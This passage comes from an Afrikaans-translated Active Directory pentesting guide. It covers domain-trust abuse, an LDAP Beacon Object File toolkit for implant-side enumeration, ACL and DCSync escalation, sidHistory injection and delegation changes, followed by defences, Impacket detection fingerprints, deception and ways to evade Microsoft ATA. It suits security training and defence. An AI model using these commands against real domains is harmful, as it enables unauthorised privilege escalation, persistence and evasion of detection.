Verder, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP-sessie**-proses **backdoors** in die **opstartlêergids van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Versagting van misbruik van domeinvertroue

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-kenmerk oor forest trusts uitbuit, word deur SID Filtering versag. Dit is by verstek op alle inter-forest trusts geaktiveer. Dit berus op die aanname dat intra-forest trusts veilig is, en beskou die forest, eerder as die domein, as die sekuriteitsgrens, soos Microsoft se standpunt bepaal.
- Daar is egter 'n probleem: SID filtering kan toepassings en gebruikerstoegang ontwrig, wat daartoe lei dat dit soms gedeaktiveer word.

### **Selective Authentication:**

- Vir inter-forest trusts verseker Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan word uitdruklike toestemmings vereis voordat gebruikers toegang tot domeine en bedieners binne die vertrouende domein of forest kan kry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerming bied teen die uitbuiting van die writable Configuration Naming Context (NC) of aanvalle op die trust account nie.

[**Meer inligting oor domeintrusts op ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-gebaseerde AD-misbruik vanaf On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP-primitiewe as x64 Beacon Object Files wat geheel en al binne 'n on-host implant (bv. Adaptix C2) loop. Operateurs bou die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs` en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle verkeer gebruik die huidige aanmeldsekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese sertifikaatvertroue, dus is geen socks proxies of artefakte op skyf nodig nie.<sup>[[4]](#references)</sup>

### LDAP-enumerasie aan die implant-kant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` en `get-groupmembers` los kort name/OU-paaie na volledige DNs op en stort die ooreenstemmende objekte uit.
- `get-object`, `get-attribute` en `get-domaininfo` haal arbitrêre attribute (insluitend sekuriteitsbeskrywers) plus die forest-/domeinmetadata van `rootDSE` op.
- `get-uac`, `get-spn`, `get-delegation` en `get-rbcd` wys kandidate vir roasting, delegasie-instellings en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-beskrywers direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` ontleed die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes) en oorerwing te lys, en gee onmiddellike teikens vir voorregte-eskalasie via ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP-skryfprimitiewe vir eskalasie en persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur nuwe principals of masjienrekeninge voorberei waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute` en `set-attribute` kaap teikens direk sodra write-property-regte gevind word.
- ACL-gefokusde opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` en `add-dcsync` omskep WriteDACL/WriteOwner op enige AD-objek in wagwoordterugstellings, beheer oor groeplidmaatskap of DCSync-replikasievoorregte, sonder om PowerShell/ADSI-artefakte agter te laat. `remove-*`-eweknieë maak ingevoegde ACE’s skoon.

### Delegation, roasting en Kerberos-misbruik

- `add-spn`/`set-spn` maak ’n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC-skakelaar) merk die gebruiker vir AS-REP-roasting sonder om die wagwoord aan te raak.
- Delegation-makro’s (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-vlae of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanuit die beacon. Dit maak constrained/unconstrained/RBCD-aanvalspaaie moontlik en skakel die behoefte aan afgeleë PowerShell of RSAT uit.

### sidHistory-inspuiting, OU-verskuiwing en vorming van die aanvaloppervlak

- `add-sidhistory` spuit bevoorregte SID’s in die SID-geskiedenis van ’n beheerde principal in (sien [SID-History Injection](sid-history-injection.md)), en bied só sluipende toegangerwing volledig oor LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, sodat ’n aanvaller bates onder gedelegeerde regte kan bring voordat `set-password`, `add-groupmember` of `add-spn` gebruik word. Sien [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) vir skuifregte en oorerwingskontroles.
- Noukeurig afgebakende verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige terugrol moontlik nadat die operateur geloofsbriewe of persistence ingesamel het, en beperk só telemetrie.

### AD -> Azure en Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Enkele algemene verdedigingstrategieë

[**Kom hier meer te wete oor hoe om geloofsbriewe te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Verdedigingsmaatreëls vir geloofsbriefbeskerming**

- **Beperkings vir Domain Admins**: Dit word aanbeveel dat Domain Admins slegs by Domain Controllers mag aanmeld, en nie op ander gashere gebruik word nie.
- **Voorregte vir diensrekeninge**: Dienste moet nie met Domain Admin (DA)-voorregte uitgevoer word nie, om sekuriteit te handhaaf.
- **Tydelike beperking van voorregte**: Vir take wat DA-voorregte vereis, moet die duur daarvan beperk word. Dit kan soos volg gedoen word: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Versagting van LDAP-relay**: Oudit Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DC’s/kliënte af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokolvlak-vingerafdrukke van Impacket-aktiwiteit

As jy algemene AD-taktieke wil opspoor, **moenie net staatmaak op artefakte waaroor die operateur beheer het nie**, soos hernoemde binaries, diensname, tydelike bondellêers of uitvoerpaaie. Stel ’n basislyn op van hoe wettige Windows-kliënte [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- en WMI-verkeer saamstel, en soek dan na **implementeringskenmerke** wat behoue bly selfs nadat die operateur `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` of `ntlmrelayx.py` gewysig het.<sup>[[8]](#references)</sup>

- **Kandidate met hoë vertroue wat op hul eie kan staan** (nadat dit teen jou eie basislyn bekragtig is):
  - Geëtente DCE/RPC met `auth_context_id = 79231 + ctx_id`
  - DCE/RPC-verifikasievulling met `0xff`
  - LDAP Kerberos-bindings wat ’n rou Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
  - SMB2/3-onderhandelingsversoeke met ASCII-agtige `ClientGuid`-waardes
  - WMI `IWbemLevel1Login::NTLMLogin` wat die nie-standaard naamruimte `//./root/cimv2` gebruik
  - Hardgekodeerde Kerberos-nonce-waardes
- **Beter geskik as korrelasie-/tellingkenmerke**:
  - Yl of duplikaat Kerberos-etype-lyste, ongewone/ontbrekende `PA-DATA`, of ’n TGS-REQ-etype-volgorde wat van native Windows verskil
  - NTLM Type 1-boodskappe sonder weergawe-inligting of Type 3-boodskappe met null gasheername
  - Rou NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC-verifikasievoetskrifte, of SPNEGO/Kerberos-OID-wanpassings
  - Verskeie van hierdie kenmerke vanaf dieselfde gasheer/gebruiker/sessie/tydvenster is baie sterker as enige enkele swak veld
- **Gebruik dit as verryking, nie as selfstandige waarskuwings nie**:
  - Versteklêername, uitvoerpaaie, ewekansige diensname, tydelike bondelname, verstekrekenaarrekeningname en nutsmiddelspesifieke HTTP/WebDAV/RDP/MSSQL-stringe
  - Operateurs kan dit maklik verander; gebruik dit eerder om te verduidelik waarom ’n kruisprotokolgroep verdag is
- **Operasionele notas**:
  - Sommige van hierdie seine vereis gedekripteerde verkeer, [PCAP/Zeek-ontleding](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW of sigbaarheid aan die dienskant
  - Valideer teen Samba/Linux-kliënte, toestelle en verouderde sagteware voordat jy dit as waarskuwings aktiveer
  - Bevorder opsporings van verryking -> jagtogte -> waarskuwings namate jy vertroue in die basislyn opbou

### **Implementering van misleidingstegnieke**

- Misleiding behels die opstel van lokvalle, soos lokgebruikers of -rekenaars met eienskappe soos wagwoorde wat nie verval nie, of wat as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in om gebruikers met spesifieke regte te skep of hulle by groepe met hoë voorregte te voeg.<sup>[[2]](#references)</sup>
- ’n Praktiese voorbeeld is die gebruik van nutsmiddels soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van misleidingstegnieke is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van misleiding**

- **Vir gebruikersobjekte**: Verdagte aanwysers sluit in ’n atipiese ObjectSID, ongereelde aanmeldings, skeppingsdatums en lae tellings vir verkeerde wagwoorde.
- **Algemene aanwysers**: Deur die eienskappe van moontlike lokobjekte met dié van egte objekte te vergelyk, kan teenstrydighede aan die lig kom. Nutsmiddels soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke misleiding te identifiseer.

### **Omseiling van opsporingstelsels**

- **Omseiling van Microsoft ATA-opsporing**:
  - **Gebruikerenumerasie**: Vermy sessie-enumerasie op Domain Controllers om ATA-opsporing te voorkom.
  - **Kaartjie-identiteitsnabootsing**: Die gebruik van **aes**-sleutels vir kaartjieskepping help om opsporing te ontduik deur nie na NTLM af te gradeer nie.
  - **DCSync-aanvalle**: Dit word aanbeveel om dit vanaf ’n nie-Domain Controller uit te voer om ATA-opsporing te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller waarskuwings sal aktiveer.

## References

- [1] [’n Gids vir die aanval op domeinvertrouensverhoudings](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Vertrouensverhoudings vervals vir misleiding in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Van Domain Admin tot Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF-versameling – LDAP-nutsmiddelstel in geheue vir Active Directory-ontginning](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Gebruik NTLM-hashes as ’n woordelys](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Ontleding van Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Oorneem van Active Directory-rekeninge via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Hoe om veranderinge aan Netlogon-veilige-kanaalverbindings wat met CVE-2020-1472 verband hou, te bestuur](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [’n Reis deur vergete Null Session- en MS-RPC-koppelvlakke](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 4) - Navorsing oor die omseiling van SID-filtrering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 5) - Golden GMSA-vertrouensaanval - van kinderdomein na ouerdomein](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 6) - Skemaverandering-vertrouensaanval - van kinderdomein na ouerdomein](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Van DA tot EA met ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalasie van kinderdomeinadministrateurs na enterprise admins in 5 minute deur AD CS te misbruik, ’n opvolg](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [’n ACE in die mou: Ontwerp van Active Directory-DACL-agterdeure](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Bronkode van NetExec pre2k-module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership-kenmerk](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
